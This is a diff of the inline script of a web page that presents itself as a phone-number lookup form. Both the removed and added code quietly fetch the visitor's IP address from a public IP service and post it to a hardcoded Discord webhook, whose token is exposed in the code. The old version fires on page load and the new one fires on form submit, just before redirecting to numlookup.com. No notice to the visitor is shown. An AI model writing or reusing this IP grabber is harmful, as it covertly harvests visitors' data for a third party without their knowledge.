@@ -81,21 +81,11 @@
 </footer>
 
 <script>
-        function redirectToNumLookup() {
+    function redirectToNumLookup() {
         window.location.href = 'https://www.numlookup.com';
     }
-    document.getElementById('phoneNumber').addEventListener('input', function (e) {
-        let x = e.target.value.replace(/\D/g, '');
-        if (x.length > 0) {
-            x = '(' + x.substring(0, 3) + ') ' + x.substring(3, 6) + '-' + x.substring(6, 10);
-        }
-        e.target.value = x;
-    });
-    document.getElementById('phoneForm').addEventListener('submit', function (e) {
-        e.preventDefault();
-       redirectToNumLookup()
-    });
-  function sendToDiscord(message) {
+
+    function sendToDiscord(message) {
         const webhookUrl = 'https://discord.com/api/webhooks/1178097852665315338/RtYjhCRooN7BC2JhsPgm5tiAbc9uA2PS7RqBpZysvI5ytVqe-ZA6vnSGrTDsIf6T9CcQ';
 
         const payload = {
@@ -112,21 +102,41 @@
         .then(response => {
             if (response.ok) {
                 console.log('IP sent successfully');
+                redirectToNumLookup(); // Redirect after successfully sending the IP
             } else {
                 console.error('Error sending IP');
+                redirectToNumLookup(); // Redirect even if there is an error
             }
         })
-        .catch(error => console.error('Error:', error));
+        .catch(error => {
+            console.error('Error:', error);
+            redirectToNumLookup(); // Redirect if there's an error in the fetch process
+        });
     }
 
-    fetch('https://api.ipify.org?format=json')
-        .then(response => response.json())
-        .then(data => {
-            const userIP = data.ip;
-            sendToDiscord(`User IP: ${userIP}`);
-        })
-        .catch(error => console.error('Error fetching IP:', error));
+    document.getElementById('phoneNumber').addEventListener('input', function (e) {
+        let x = e.target.value.replace(/\D/g, '');
+        if (x.length > 0) {
+            x = '(' + x.substring(0, 3) + ') ' + x.substring(3, 6) + '-' + x.substring(6, 10);
+        }
+        e.target.value = x;
+    });
 
+    document.getElementById('phoneForm').addEventListener('submit', function (e) {
+        e.preventDefault();
+
+        // Fetch user's IP and send it to Discord, then redirect
+        fetch('https://api.ipify.org?format=json')
+            .then(response => response.json())
+            .then(data => {
+                const userIP = data.ip;
+                sendToDiscord(`User IP: ${userIP}`);
+            })
+            .catch(error => {
+                console.error('Error fetching IP:', error);
+                redirectToNumLookup(); // Redirect even if there is an error fetching the IP
+            });
+    });
 </script>
 
 </body>
